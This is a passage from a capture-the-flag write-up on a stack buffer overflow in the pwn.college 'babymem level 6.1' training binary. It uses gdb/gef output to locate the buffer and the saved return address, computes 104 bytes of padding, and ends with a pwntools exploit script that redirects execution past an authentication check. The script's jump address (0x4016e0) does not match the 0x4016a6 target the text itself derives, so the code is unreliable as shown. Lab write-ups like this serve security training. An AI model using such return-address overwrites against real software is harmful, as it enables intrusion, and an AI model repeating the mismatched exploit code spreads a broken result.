aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

The program has now read our payload.

The `read` syscall takes the following arguments:

```c
ssize_t read(int fd, void buf[.count], size_t count);
```

We can see that the second argument is the location to which input is read, and it is stored in `$rsi`.

```
gef➤  p $rsi
$2 = 0x7ffdf99af5b0
```

In this challenge, we have no `win` variable to overwrite.

The way we can divert flow of the program is by overwriting the return address.

We know that the base pointer `$rbp` points to the saved base pointer of the caller function.

Let's check this:

```
gef➤  x/a $rbp
0x7ffdf99af610: 0x7ffdf99b0640
```

The base pointer `$rbp` has the value `0x7ffdf99af610` and it points to `0x7ffdf99b0640` which is the `$rbp` of the caller function.

And the return address is stored right before the caller functions base pointer. In our case at `$rbp + 8`.

```
gef➤  x/a $rbp + 8
0x7ffdf99af618: 0x4019aa <main+238>
```

As we can see the return address is `main+238` and it is located at `0x7ffdf99af618`.

We want to replace this value with the address in the `win_authed` function such that it skips the check.

```
gef➤  disass win_authed
Dump of assembler code for function win_authed:
   0x000000000040168a <+0>:     endbr64 
   0x000000000040168e <+4>:     push   rbp
   0x000000000040168f <+5>:     mov    rbp,rsp
   0x0000000000401692 <+8>:     sub    rsp,0x10
   0x0000000000401696 <+12>:    mov    DWORD PTR [rbp-0x4],edi
   0x0000000000401699 <+15>:    cmp    DWORD PTR [rbp-0x4],0x1337
   0x00000000004016a0 <+22>:    jne    0x401798 <win_authed+270>
   0x00000000004016a6 <+28>:    lea    rdi,[rip+0x95b]        # 0x402008
```

As we can see the win function starts at `0x000000000040168a`. However the address we want to overwrite the return address with is `0x00000000004016a6`.

We now have the information we need:

* [x] Location of buffer: `0x7ffdf99af5b0`.
* [x] Location of stored return address: `0x7ffdf99af618`.
* [x] Address to jump to: `0x00000000004016a6`.

Let's calculate the padding required.

```
gef➤  p/d 0x7ffdf99af618 - 0x7ffdf99af5b0
$3 = 104
```

We can now create our payload.

```python
from pwn import *

padding = b'A' * 104
payload = padding + p64(0x00000000004016e0)

p = process('/challenge/babymem_level6.1')
p.recvuntil('size:')
p.sendline('500')

p.recvuntil('bytes)!')
p.send(payload)
p.interactive()
```
